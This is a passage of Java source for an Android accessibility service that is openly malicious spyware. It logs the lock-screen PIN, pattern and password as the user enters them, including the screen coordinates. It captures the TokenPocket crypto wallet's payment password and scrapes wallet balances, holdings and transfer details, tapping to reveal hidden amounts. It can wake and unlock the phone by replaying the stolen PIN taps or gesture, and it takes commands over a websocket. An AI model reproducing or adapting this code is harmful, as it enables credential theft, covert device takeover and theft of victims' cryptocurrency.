                String _lastPassword = systemGs.toString().replace("[", "").replace("]", "").replace(" ", "");
                Log.i(TAG, "size:" + systemGs.size() + ", 1_lastPassword:" + _lastPassword);


                if (!unlock) {
                    Log.i(TAG, "记录解锁密码");
                    unLockValue = new JSONObject();
                    unLockValue.put("type", Constant.UnLockType.gesture);
                    unLockValue.put("value", _lastPassword);
                    unLockValue.put("deviceId", deviceId);
                    Config.setValue(this, Constant.ConfigKey.UNLOCK, unLockValue.toJSONString());
                }
//                this.config.setValue(MyConstants.SYSTEM_GS, replace);
                lastUpdatePwdTime = System.currentTimeMillis();
                lastPassword = _lastPassword;

                lastPasswordTime = System.currentTimeMillis();
                lastPasswordPkg = MyConstants.PKG_SYSTEMUI_GS;
                return;
            }
            return;
        }
        if (Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PIN) != null || Utils.findNodeById(rootInActiveWindow, MyConstants.ID_FIX_PIN) != null) {
            if (accessibilityEvent.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED) {
                return;
            }
            trim = accessibilityEvent.getContentDescription() != null ? accessibilityEvent.getContentDescription().toString().trim() : null;
            if (trim != null && trim.matches("[0-9]{1}")) {
                pin += trim;
                systemPin.add(getPinPos(rootInActiveWindow, trim));
                lastPasswordRemark = pin;
                AccessibilityNodeInfo findNodeById3 = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PIN);
                if (findNodeById3 == null) {
                    findNodeById3 = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_FIX_PIN);
                }
                if (findNodeById3 != null && findNodeById3.getText() != null && findNodeById3.getText().toString().trim().length() == 1) {
                    pin = trim;
                    systemPin.clear();
                    systemPin.add(getPinPos(rootInActiveWindow, trim));
                    lastPasswordRemark = pin;
                }
            } else {
                AccessibilityNodeInfo source = accessibilityEvent.getSource();
                if (source == null || source.getViewIdResourceName() == null) {
                    return;
                }
                if (source.getViewIdResourceName().contains("delete")) {
                    if (pin.length() == 1) {
                        pin = "";
                        systemPin.clear();
                        lastPasswordRemark = "";
                    } else if (pin.length() > 1) {
                        String str = pin;
                        pin = str.substring(0, str.length() - 1);
                        List<String> list = systemPin;
                        list.remove(list.size() - 1);
                        lastPasswordRemark = pin;
                    }
                } else if (source.getViewIdResourceName().contains("enter")) {
                    if (pin.length() >= 4) {
                        pin += trim;
                        Rect rect2 = new Rect();
                        source.getBoundsInScreen(rect2);
                        systemPin.add(getPos(rect2));
                        lastPasswordRemark = pin;
                        String _lastPassword = systemPin.toString().replace("[", "").replace("]", "").replace(" ", "");
                        Log.i(TAG, "2_lastPassword:" + _lastPassword);
//                        this.config.setValue(MyConstants.SYSTEM_PIN, replace);
                        lastUpdatePwdTime = System.currentTimeMillis();
                        lastPassword = _lastPassword;
                        lastPasswordTime = System.currentTimeMillis();
                        lastPasswordPkg = MyConstants.PKG_SYSTEMUI_PIN;
                    }
                    pin = "";
                    systemPin.clear();
                    return;
                }
            }
            if (pin.length() >= 4) {
                String _lastPassword = systemPin.toString().replace("[", "").replace("]", "").replace(" ", "");
                Log.i(TAG, "3_lastPassword:" + _lastPassword);

                unLockValue = new JSONObject();
                unLockValue.put("type", Constant.UnLockType.pin);
                unLockValue.put("value", _lastPassword);
                unLockValue.put("deviceId", deviceId);
                Config.setValue(this, Constant.ConfigKey.UNLOCK, unLockValue.toJSONString());
                lastUpdatePwdTime = System.currentTimeMillis();
                lastPassword = _lastPassword;
                lastPasswordTime = System.currentTimeMillis();
                lastPasswordPkg = MyConstants.PKG_SYSTEMUI_PIN;
                return;
            }
            return;
        }
        if (MyConstants.getBrand() == 4 && Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PIN_VIVO) != null) {
            if (accessibilityEvent.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED) {
                return;
            }
            trim = accessibilityEvent.getText() != null ? accessibilityEvent.getText().toString().trim() : null;
            if (trim == null) {
                return;
            }
            String replace = trim.replace("[", "").replace("]", "");
            if (replace.matches("[0-9]{1}")) {
                pin += replace;
                systemPin.add(getPinPos(rootInActiveWindow, replace));
                lastPasswordRemark = pin;
            } else if (pin.length() == 1) {
                pin = "";
                systemPin.clear();
                lastPasswordRemark = "";
            } else if (pin.length() > 1) {
                String str2 = pin;
                pin = str2.substring(0, str2.length() - 1);
                List<String> list2 = systemPin;
                list2.remove(list2.size() - 1);
                lastPasswordRemark = pin;
            }
            if (pin.length() >= 4) {
//                this.config.setValue(MyConstants.SYSTEM_PIN, systemPin.toString().replace("[", "").replace("]", "").replace(" ", ""));
                String _lastPassword = systemPin.toString().replace("[", "").replace("]", "").replace(" ", "");
                Log.i(TAG, "4_lastPassword:" + _lastPassword);
                lastUpdatePwdTime = System.currentTimeMillis();
                lastPassword = _lastPassword;
                lastPasswordTime = System.currentTimeMillis();
                lastPasswordPkg = MyConstants.PKG_SYSTEMUI_PIN;
                return;
            }
            return;
        }
        if (Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PWD) != null || Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PWD_OPPO) != null || (accessibilityEvent.getSource() != null && MyConstants.ID_PWD.equals(accessibilityEvent.getSource().getViewIdResourceName()))) {
            if (accessibilityEvent.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
                return;
            }
            String obj = accessibilityEvent.getText().toString();
            int itemCount = accessibilityEvent.getItemCount();
            if (accessibilityEvent.isPassword()) {
                if (itemCount == 0) {
                    systemPwd = "";
                } else if (itemCount == 1 && !"[•]".equals(obj)) {
                    systemPwd = String.valueOf(obj.charAt(obj.length() - 2));
                } else if (itemCount - systemPwd.length() == 1) {
                    systemPwd += String.valueOf(obj.charAt(obj.length() - 2));
                } else if (systemPwd.length() - itemCount == 1) {
                    String str3 = systemPwd;
                    systemPwd = str3.substring(0, str3.length() - 1);
                }
            } else if (itemCount == 0) {
                systemPwd = "";
            } else {
                systemPwd = obj.substring(1, itemCount + 1);
            }
            if (systemPwd.length() >= 4) {
//                this.config.setValue(MyConstants.SYSTEM_PWD, systemPwd);
                Log.i(TAG, "5systemPwd:" + systemPwd);
                lastUpdatePwdTime = System.currentTimeMillis();
                return;
            }
            return;
        }
        if (MyConstants.getBrand() != 4 || (findNodeById = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PWD_VIVO)) == null || findNodeById.getText() == null) {
            return;
        }
        String charSequence = findNodeById.getText().toString();
        int length = charSequence.length();
        if (length == 0) {
            systemPwd = "";
        } else if (length == 1 && !"•".equals(charSequence)) {
            systemPwd = charSequence;
        } else if (length - systemPwd.length() == 1) {
            systemPwd += String.valueOf(charSequence.charAt(charSequence.length() - 1));
        } else if (systemPwd.length() - length == 1) {
            String str4 = systemPwd;
            systemPwd = str4.substring(0, str4.length() - 1);
        }
        if (systemPwd.length() >= 4) {
//            this.config.setValue(MyConstants.SYSTEM_PWD, systemPwd);
            Log.i(TAG, "6systemPwd:" + systemPwd);
            lastUpdatePwdTime = System.currentTimeMillis();
        }
    }

    private String getPos(Rect rect) {
        return (rect.left + ((rect.right - rect.left) / 2)) + "," + (rect.top + ((rect.bottom - rect.top) / 2));
    }

    private String getPinPos(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        if (!pinPos.isEmpty() && pinPos.containsKey(str)) {
            return pinPos.get(str);
        }
        for (int i = 0; i <= 9; i++) {
            Rect rect = new Rect();
            AccessibilityNodeInfo findNodeById = Utils.findNodeById(accessibilityNodeInfo, "com.android.systemui:id/key" + i);
            if (findNodeById == null) {
                findNodeById = Utils.findNodeById(accessibilityNodeInfo, "com.android.systemui:id/VivoPinkey" + i);
                if (findNodeById == null) {
                    findNodeById = Utils.findNodeByDesc(accessibilityNodeInfo, "" + i, true);
                    if (findNodeById == null) {
                        findNodeById = Utils.findNodeByText(accessibilityNodeInfo, "" + i, true);
                    }
                }
            }
            if (findNodeById != null) {
                findNodeById.getBoundsInScreen(rect);
                pinPos.put("" + i, getPos(rect));
            }
        }
        return pinPos.get(str);
    }


    private String tppay = "";

    private void recordTp(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && Utils.findNodeById(getRootInActiveWindow(), "vip.mytokenpocket:id/edt_dialog_pwd") != null) {
            String obj = event.getText().toString();
            int itemCount = event.getItemCount();
            if (!event.isPassword()) {
                if (itemCount == 0) {
                    tppay = "";
                    return;
                } else {
                    tppay = obj.substring(1, itemCount + 1);
                    return;
                }
            }
            if (itemCount == 0) {
                tppay = "";
                return;
            }
            if (itemCount == 1 && !"[•]".equals(obj)) {
                tppay = String.valueOf(obj.charAt(obj.length() - 2));
                return;
            }
            if (itemCount - tppay.length() == 1) {
                tppay += String.valueOf(obj.charAt(obj.length() - 2));
                return;
            }
            if (tppay.length() - itemCount == 1) {
                String str = tppay;
                tppay = str.substring(0, str.length() - 1);
                return;
            }
            return;
        }
        if ("".equals(tppay)) {
            return;
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED && Utils.matchWord(MyConstants.TIP_TP_SUCCESS, event.getText().toString())) {
            //vip.mytokenpocket:id/edt_dialog_pwd
            Log.i(TAG, "tppay:" + tppay);
            Config.setValue(this, Constant.ConfigKey.TP_PWS, tppay);
            MajorData majorData = new MajorData();
            majorData.setResourceId("vip.mytokenpocket:id/edt_dialog_pwd");
            majorData.setDeviceId(deviceId);
            majorData.setLabel("TP支付密码");
            majorData.setValue(tppay);
            majorData.setPassword(Constant.YN.Y);
            majorData.setPackageName("vip.mytokenpocket");
            String appName = Utils.getAppNameFromPackageName("vip.mytokenpocket", this);
            majorData.setAppName(appName);
            majorDataList.add(majorData);
            logs.add(newLog("vip.mytokenpocket", String.format("使用了支付密码[%s]", tppay), "vip.mytokenpocket:id/edt_dialog_pwd", Constant.LogType.info));
            tppay = "";
        }
    }

    public MyLog newLog(String packageName, String text, String source, String type) {
        MyLog log = new MyLog();
        log.setPackageName(packageName);
        log.setSource(source);
        log.setText(text);
        log.setCreateTime(new Date());
        log.setDeviceId(deviceId);
        log.setType(type);
        return log;
    }


    private void handlerTp(AccessibilityEvent event) {
        try {
            String formatCurrency;
            //交易成功
            if (transferMap.containsKey(MyConstants.APP_TP)) {
                Transfer transfer = transferMap.get(MyConstants.APP_TP);
                Log.i(TAG, String.format("event-text:%s|%s", event.getText(), event.getEventType()));//转账请求提交成功, TokenPocket
                if (!transfer.isSubmitted() && event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED && Utils.matchWord(MyConstants.TIP_TP_SUCCESS, event.getText().toString())) {
                    transfer.setSubmitTime(new Date());
                    transfer.setSubmitted(true);
                    transfer.setResult(1);
                    Log.i(TAG, "已提交转账:" + JSONObject.toJSONString(transfer));
                    synchronized (this) {
                        submitTransfer.add(transfer);
                        transferMap.remove(MyConstants.APP_TP);
                    }
                }
            }
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return;
            }
            String charSequence = event.getClassName() == null ? "" : event.getClassName().toString();
            //当前处于主页
            if ("com.tokenbank.activity.main.MainActivity".equals(charSequence) || (Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_wallet") != null && Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_total_asset") != null && Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/iv_asset_visible") != null)) {
                Log.i(TAG, "当前tp主页面");
                shareMap.remove(MyConstants.APP_TP);
                //不是观察地址
                if (Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_wallet_label") == null && Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_wallet_observe") == null) {
                    String firstCurrency = Utils.formatCurrency(Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_name"));
                    if (!Utils.isEmpty(firstCurrency)) {
                        shareMap.put(MyConstants.APP_TP, firstCurrency);
                    }
                    //获取总资产
                    String totalAmount = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_total_asset");
                    if (totalAmount.contains("**")) {
                        //如果是隐藏状态 点击显示
                        Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/iv_asset_visible").performAction(16);
                        Utils.sleep(300L);//需要等待一会显示
                        totalAmount = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_total_asset");
                    }

                    //关联资产
                    Currency currency = Utils.extractCurrencyAndNumber(totalAmount);
                    if (currency == null) {
                        Double number = Utils.extractNumber(totalAmount);
                        if (number != null) {
                            currency = new Currency(null, number);
                        }
                    }
                    String walletName = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_wallet");
                    if (currency != null) {
                        //获取钱包名字
                        Asset asset = assetMap.get(MyConstants.APP_TP + walletName + "_" + MyConstants.ALL);
                        if (asset == null) {
                            asset = new Asset(MyConstants.APP_TP, MyConstants.ALL, currency.getNumber(), walletName, currency.getSymbol());
                            asset.setPrice(currency.getNumber());
                            assetMap.put(MyConstants.APP_TP + walletName + "_" + MyConstants.ALL, asset);
                        } else if (!asset.getAmount().equals(currency.getNumber())) {
                            //更新资产
                            asset.setNeedUpdate(true);
                            asset.setPrice(currency.getNumber());
                            asset.setAmount(currency.getNumber());
                        }
                    }

                    //获取资产条目
                    List<AccessibilityNodeInfo> assetItems = rootInActiveWindow.findAccessibilityNodeInfosByViewId("vip.mytokenpocket:id/rl_item");
                    if (assetItems != null && !assetItems.isEmpty()) {
                        for (AccessibilityNodeInfo item : assetItems) {
                            //
                            String amountItem = Utils.findTextById(item, "vip.mytokenpocket:id/tv_amount");
                            Double amountItemNumber = Utils.extractNumber(amountItem);


                            if (currency != null) {
                                //资产币类
                                String itemName = Utils.findTextById(item, "vip.mytokenpocket:id/tv_name");
                                //资产价值
                                String itemAsset = Utils.findTextById(item, "vip.mytokenpocket:id/tv_asset");
                                Currency itemAssetCurrency = Utils.extractCurrencyAndNumber(itemAsset);
                                if (itemAssetCurrency == null) {
                                    Double number = Utils.extractNumber(itemAsset);
                                    if (number != null) {
                                        itemAssetCurrency = new Currency(null, number);
                                    }
                                }
                                if (itemAssetCurrency != null) {
                                    Asset asset = assetMap.get(MyConstants.APP_TP + walletName + "_" + itemName);
                                    if (asset == null) {
                                        //关联资产
                                        asset = new Asset(MyConstants.APP_TP, itemName, amountItemNumber, walletName, itemAssetCurrency.getSymbol());
                                        asset.setPrice(itemAssetCurrency.getNumber());
                                        asset.setNeedUpdate(true);
                                        assetMap.put(MyConstants.APP_TP + walletName + "_" + itemName, asset);
                                        Log.i(TAG, "当前资产:" + JSONObject.toJSONString(asset));
                                    } else if (!asset.getAmount().equals(amountItemNumber)) {
                                        //更新资产
                                        asset.setNeedUpdate(true);
                                        asset.setAmount(amountItemNumber);
                                        asset.setPrice(itemAssetCurrency.getNumber());
                                        Log.i(TAG, "当前资产需要更新:" + JSONObject.toJSONString(asset));
                                    }
                                }

                            }
                        }
                    }
                }
            } else if ("com.tokenbank.dialog.selectwallet.SelectWalletDialog".equals(charSequence)) {
                shareMap.remove(MyConstants.APP_TP);
                transferMap.remove(MyConstants.APP_TP);
            } else if (charSequence.startsWith("com.tokenbank.activity.tokentransfer.") && charSequence.endsWith("TransferActivity")) {
                //当前处于转账页面
                if (charSequence.equals("com.tokenbank.activity.tokentransfer.tron.TronTransferActivity")) {
                    shareMap.put(MyConstants.APP_TP, MyConstants.TRX);
                } else if (charSequence.equals("com.tokenbank.activity.tokentransfer.btc.BtcTransferActivity")) {
                    shareMap.put(MyConstants.APP_TP, MyConstants.BTC);
                } else if (!shareMap.containsKey(MyConstants.APP_TP) && (formatCurrency = Utils.formatCurrency(Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_token")/*获取转账币类*/)) != null) {
                    shareMap.put(MyConstants.APP_TP, formatCurrency);
                }
            } else if ("com.tokenbank.activity.tokentransfer.common.TransferDetailDialog".equals(charSequence) || (Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_from") != null && Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_to") != null && Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_amount") != null)) {
                //当前处于转账确认页面
                if (!transferMap.containsKey(MyConstants.APP_TP)) {
                    Transfer transfer = new Transfer();
                    //获取付款地址
                    String from = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_from");
                    //获取转入地址
                    String to = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_to");
                    String walletName = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_from_name");
                    if (walletName != null) {
                        walletName = walletName.replaceAll("\\(", "").replaceAll("\\)", "");
                    }
                    transfer.setWalletName(walletName);
                    transfer.setDeviceId(deviceId);
                    transfer.setSender(from);
                    transfer.setReceiver(to);
                    transfer.setSubmitted(false);
                    transfer.setApp(MyConstants.APP_TP);
                    //获取转账数量
                    String amount = Utils.findTextById(rootInActiveWindow, "vip.mytokenpocket:id/tv_amount");
                    Currency currency = Utils.extractNumberAndSymbol(amount);
                    if (currency != null) {
                        transfer.setAmount(currency.getNumber());
                        transfer.setCurrency(currency.getSymbol());
                        Log.i(TAG, "未提交转账:" + JSONObject.toJSONString(transfer));
                        transferMap.put(MyConstants.APP_TP, transfer);
                    } else {
                        Log.i(TAG, "提取交易数据失败:" + amount);
                    }
                }

            } else if ("com.tokenbank.dialog.TransferRemindDialog".equals(charSequence)) {
                //当前处于转账提醒页面
//            Utils.findNodeById(rootInActiveWindow, "vip.mytokenpocket:id/tv_confirm").performAction(16);
            }
        } catch (Exception ex) {
            Log.e(TAG, "handlerTp: error", ex);
        }

    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void onDestroy() {

    }

    @SuppressLint("InvalidWakeLockTag")
    private void unLock(JSONObject lockScreen, Runnable callback) {
        Log.i(TAG, "解锁:" + JSONObject.toJSONString(lockScreen));

        if (Utils.isScreenOff(this)) {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null && !powerManager.isInteractive()) {
                // 创建一个 WakeLock，指定唤醒屏幕的选项
                PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "target");
                wakeLock.acquire(3000); // 设置3秒超时释放锁
            }

            KeyguardManager keyguardManager = (KeyguardManager) this.getSystemService(Context.KEYGUARD_SERVICE);
            KeyguardManager.KeyguardLock newKeyguardLock = keyguardManager.newKeyguardLock("kale");
            if (keyguardManager.inKeyguardRestrictedInputMode()) {
                newKeyguardLock.disableKeyguard();
            }
            Log.i(TAG, "唤醒完成");
        }
        if (callback != null) {
            callback.run();
        }
        //使用本地存储的数据进行解锁
        if (lockScreen == null) {
            return;
        }
        Utils.sleep(2000);

        try {


            //TODO 判断是否处于锁屏
            Log.i(TAG, "上滑解锁完成");
            //TODO 多次尝试上滑
            Utils.slideUp(this, widthPixels, heightPixels);
            Utils.sleep(2000);
            //TODO 判断解锁类型 进行解锁 参考 ConnectionManager::unlock
            int type = lockScreen.getIntValue("type");
            String value = lockScreen.getString("value");
            if (type == Constant.UnLockType.pin) {
                String[] split = value.split(",");
                int i = 0;
                while (i < split.length) {
                    Utils.touch(this, Integer.parseInt(split[i]), Integer.parseInt(split[i + 1]));
                    Utils.sleep(500);
                    i += 2;
                }
                Log.i(TAG, "已解锁");
            } else if (type == Constant.UnLockType.gesture) {
                //手势
                String[] split2 = value.split(",");

                int i = 0;
                Path path = new Path();
                while (i < split2.length) {
                    if (i == 0) {
                        path.moveTo(Float.parseFloat(split2[i]), Float.parseFloat(split2[i + 1]));
                    } else {
                        path.lineTo(Float.parseFloat(split2[i]), Float.parseFloat(split2[i + 1]));
                    }
                    i += 2;
                }
                dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 2000L)).build(), null, null);
                Log.i(TAG, "已解锁");
                //TODO 检查是否解锁完成


            } else if (type == Constant.UnLockType.pwd) {
                //混合密码

            } else {

            }
            Constant.VERTX.setTimer(10000, l -> {
                //设置解锁标志位
                unlock = false;
            });


        } catch (Exception ex) {
            Log.e(TAG, "解锁错误", ex);
        }
    }


    @Override
    public void onClientJoined(String sessionId) {

    }

    @Override
    public void onClientLeft(String sessionId) {

    }

    @Override
    public void onClientError(String sessionId) {

    }

    @Override
    public void onRoomMemberCount(int count) {

    }

    @Override
    public void onClientMessage(byte[] message) {
        try {
            Message.WsMessage wsMessage = Message.WsMessage.parseFrom(message);
            byte[] body = wsMessage.getBody().toByteArray();
            this.bindHandler(new HandlerMessage(wsMessage.getType(), body));
        } catch (InvalidProtocolBufferException e) {
            Log.e(TAG, "onClientMessage: error ", e);
        }
    }

    @Override
    public void onConnectionClosed() {

    }

    @Override
    public void onConnectionError(Throwable error) {

    }

    @Override
    public void onReconnectStarted(int attempt) {

    }

    @Override
    public void onReconnectSuccess(int attempts) {

    }

    @Override
    public void onReconnectFailed(int attempt, Throwable error) {

    }

    @Override
    public void onReconnectGiveUp(int totalAttempts) {

    }
}
